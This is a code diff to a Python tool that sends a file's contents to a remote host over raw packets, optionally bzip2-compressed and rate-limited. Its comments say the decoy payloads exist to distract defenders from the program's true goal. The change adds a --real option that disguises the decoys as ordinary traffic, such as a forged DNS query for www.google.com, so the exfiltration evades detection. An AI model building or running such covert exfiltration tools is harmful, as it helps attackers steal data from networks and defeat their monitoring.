@@ -19,7 +19,7 @@
 import argparse
 import base64
 import bz2
-import random
+from random import randrange, choice
 import socket
 import string
 import sys
@@ -43,9 +43,11 @@ parser.add_argument('-f', nargs=1, metavar='filename', help='Input file name')
 parser.add_argument('-r', nargs=1, metavar='integer',
     help='Number of packets to send per second ' +
     '(default 1; recommended is 5 or less)')
+parser.add_argument('--real', action='store_true', help='Make the packets ' +
+    'look like real traffic (defaults to random if unknown port)')
 parser.add_argument('-v', action='store_true', help='Verbose mode (be aware ' +
     'that this may leave behind artifacts)')
-parser.add_argument('-V', action='version', version='0.3',
+parser.add_argument('-V', action='version', version='0.4',
     help='Display version number')
 parser.add_argument('-z', action='store_true',
     help='Compress content using bzip2 before sending')
@@ -87,20 +89,42 @@ debug_count = 0
 data = ''
 
 
-# Set default packet data.  This is a random string that is then encoded with
-# base64.  The intention is to drive the defenders nuts trying to decode and
-# then decrypt what looks like encrypted data, thus further distracting them
+# Set packet data.  By default, This is a random string that is then encoded
+# with base64.  The intention is to drive the defenders nuts trying to decode
+# and then decrypt what looks like encrypted data, thus further distracting them
 # from the true goal of the program.
 # TODO: Make this look more realistic for some protocols
 # TODO: ICMP to look like Windows, Linux, or Plan9
 # TODO: TCP to look like Windows or Linux
 def p_data():
     global data
-    data_len = random.randrange(16, 120)
-    data.join(random.choice(string.ascii_uppercase + string.digits)
-        for x in range(data_len))
-    data = base64.b64encode(data)
+    if args.real == 0:
+        data = payload_rand()
+    else:
+        data = payload_real()
     return data
+
+
+def payload_rand():
+    payload = ''
+    data_len = randrange(16, 120)
+    payload.join(choice(string.ascii_uppercase + string.digits)
+        for x in range(data_len))
+    payload = base64.b64encode(payload)
+    return payload
+
+
+def payload_real():
+    # For DNS, send a request for www.google.com
+    if proto == 'UDP':
+        if dstport == 53:
+            seq_num = chr(randrange(1, 255)) + chr(randrange(1, 255))
+            payload = '\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77'
+            payload = payload + '\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d'
+            payload = payload + '\x00\x00\x01\x00\x01'
+            payload = seq_num + payload
+            return payload
+    return payload_rand()
 
 
 # binstring takes a single character and converts it to an 8-character string
@@ -172,7 +196,7 @@ def buildandsend(delay):
     if (proto == 'ICMP'):
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
         s.connect((dest, dstport))
-        s.send(data)
+        s.send(p_data())
         s.close
         time.sleep(delay)
     return
